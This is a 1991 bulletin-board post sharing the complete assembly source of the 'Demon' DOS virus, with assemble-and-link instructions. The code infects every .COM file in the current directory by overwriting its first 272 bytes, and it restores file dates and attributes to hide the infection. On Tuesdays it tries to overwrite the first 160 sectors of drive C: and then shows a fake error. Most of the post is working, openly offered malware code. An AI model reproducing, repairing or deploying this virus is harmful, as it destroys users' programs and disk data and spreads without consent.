Dt: 19-Oct-91 04:19
 
By: Skin Head
To: All
Re: New Source Code

;========== Demon virus ==================================== 22.09.91 ========
;
; Assemble and link with:  TASM  DEMON.VIR
;                          TLINK DEMON /X/T
; Infect all .COM programs in current directory with: DEMON
;
;                       !!! NOT ON A TUESDAY !!!
;
;-------------- Constants and structures

Tuesday         =       2                       ; INT 21h, AH=2Ah

Search_Rec      struc                           ; directory search record
                db      21 dup (?)              ;   reserved for DOS
  FileAttr      db      ?                       ;   file attribute
  FileTime      dw      ?                       ;   packed file time
  FileDate      dw      ?                       ;   packed file date
  FileSize      dd      ?                       ;   long file size
  FileName      db      13 dup (?)              ;   ASCIIZ FILENAME.EXT
Search_Rec      ends

;-------------- Demon virus segment

Virus           segment
                assume  cs:Virus,ds:Virus,es:Virus,ss:Virus

                org     0080h
DTA             Search_Rec <>                   ; disk transfer area

                org     0100h
Demon:                                          ; virus entry point
Virus_Size      =       Virus_End - Demon       ; virus size = 272 bytes

                mov     dx,offset All_COM       ; find first .COM file,
                mov     ah,4eh                  ;   including hidden/system
                mov     cx,110bh
                int     21h
                nop
                jnc     Infect                  ; abort if no files found
                jmp     short Check_Day
Infect:         call    Replicate               ; overwrite first 272 bytes
                mov     dx,offset DTA
                mov     ah,4fh                  ; find next .COM file,
                int     21h                     ;   go check day if none found
                nop                             ;   else repeat
                jnc     Next_File
                jmp     short Check_Day
Next_File:      jmp     Infect
Check_Day:      mov     ah,2ah                  ; get DOS date, check day
                int     21h
                cmp     al,Tuesday              ; Tuesday ?
                je      Thrash_Drive            ; if yes, thrash drive C:
                mov     ah,4ch                  ;   else exit to DOS
                int     21h

Thrash_Drive:   mov     Counter,0               ; overwrite first 160 sectors
                jmp     Write_Sectors           ;   of drive C: with garbage
Write_Sectors:  mov     al,Drive_C              ; Error: doesn't work !
                mov     cx,160                  ; AL=C:, CX=160 sectors
                mov     dx,0                    ; DX=highest sector in drive !
                mov     bx,0                    ; DS:BX=start of PSP area
                int     26h                     ; overwrite sectors
                inc     Counter
                cmp     Counter,10              ; repeat 10 times
                je      Show_Msg
                jne     Write_Sectors
Show_Msg:       mov     ah,09h                  ; show a fake error message
                mov     dx,offset Virus_Msg     ;   and exit to DOS
                int     21h
                mov     ah,4ch
                int     21h

Replicate:      mov     dx,offset DTA.FileName  ; save file attribute
                mov     ax,4300h
                int     21h
                mov     COM_Attr,cx
                nop
                xor     cx,cx                   ; unprotect the .COM file
                mov     ax,4301h                ;   in case it's read-only
                int     21h
                nop
                mov     ax,3d02h                ; open .COM file for R/W,
                int     21h                     ;   abort on error
                nop
                jc      Check_Day
                mov     bx,ax                   ; BX = file handle
                mov     ax,5700h
                int     21h                     ; save file date and time
                nop
                mov     COM_Time,cx
                mov     COM_Date,dx
                mov     dx,offset Demon         ; overwrite first 272 bytes
                mov     ah,40h                  ;   of .COM program file
                mov     cx,Virus_Size           ;   with the virus code
                int     21h
                nop
                mov     ax,5701h                ; restore file date and time
                mov     dx,COM_Date
                mov     cx,COM_Time
                int     21h
                mov     ah,3eh                  ; close the file
                int     21h
                nop
                mov     dx,offset DTA.FileName  ; restore file attribute
                mov     cx,COM_Attr
                mov     ax,4301h
                int     21h
                retn

All_COM         db      '*.COM',0               ; dir search specification
COM_Date        dw      0                       ; packed .COM program date
COM_Time        dw      0                       ; packed .COM program time
COM_Attr        dw      0                       ; .COM program file attribute
Counter         db      0                       ; used when thrashing drive C:
Drive_C         db      2                       ; INT 26h C: drive number
                dw      0
Copyright       db      'Demonhyak Viri X.X (c) by Cracker Jack 1991 (IVRL)'
                dw      0
Virus_Msg       db      10,13,'Error eating drive C:',10,13,'$'

Virus_End       label   byte                    ; virus code+data end

Virus           ends
                end     Demon

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

